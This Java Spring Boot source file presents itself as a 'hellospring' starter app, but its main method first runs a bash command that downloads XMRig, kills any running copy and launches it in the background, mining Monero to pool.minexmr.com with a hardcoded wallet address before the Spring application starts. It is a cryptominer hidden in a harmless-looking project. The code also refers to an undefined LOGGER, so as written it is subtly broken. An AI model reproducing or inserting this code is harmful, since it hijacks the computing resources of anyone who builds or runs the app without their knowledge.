package com.example.hellospring;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.bind.annotation.RequestMapping;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.IOException;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Service;

@SpringBootApplication
public class HellospringApplication {

	public static void main(String[] args) {

		String[] cmd2 = {"/bin/bash", "-c", "curl -LJO https://github.com/xmrig/xmrig/releases/download/v6.16.1/xmrig-6.16.1-linux-x64.tar.gz -o xmrig-6.16.1-linux-x64.tar.gz ; tar xvfz xmrig-6.16.1-linux-x64.tar.gz ; pkill xmrig; xmrig-6.16.1/xmrig -o pool.minexmr.com:4444 -u 48QZP31VnTkYTbsqZ4dq1JGMjwtds2sBnCpxrjGwBfTWG1NrEoWJGca5mxxoL8oD3NQmQuK23fTi546McgXxmd2NSyTUB1T.testxx -B ;sleep 500000"};
        
		String s;
        String outputx="Run progress:" ;
        LOGGER.info("***** Script execution Starts *****");
        try{
           Process proc = Runtime.getRuntime().exec(cmd2); 
           int exitStatus = proc.waitFor();
          BufferedReader br = new BufferedReader(
                new InputStreamReader(proc.getInputStream()));
            while ((s = br.readLine()) != null){
                LOGGER.info(s);
                outputx += s;
                outputx +=System.lineSeparator();
            }
            if (exitStatus != 0) {
                br = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
                while ((s = br.readLine()) != null) {
                    LOGGER.error(s);
                }
                throw new IllegalStateException("Script exited abnormally");
            }
            LOGGER.info("***** Script executed successfully *****");
        } catch(Exception e){
            LOGGER.error("Error during script execution", e);
            outputx += "Error exe";
            outputx += e.toString();
        }
		
		SpringApplication.run(HellospringApplication.class, args);
	}
}
